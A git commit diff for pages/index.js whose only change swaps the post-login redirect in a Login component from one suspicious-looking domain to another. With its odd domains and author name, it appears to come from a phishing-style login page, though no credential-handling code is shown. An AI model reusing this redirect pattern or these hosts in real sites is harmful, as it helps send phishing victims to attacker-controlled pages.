b9197583735d4bfd324189daab33b2d25194c490
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-06-26 09:47:05 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://mink.azuz-nutty.shop/';
+      window.location.href = 'https://nero.drodge-webview.online/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
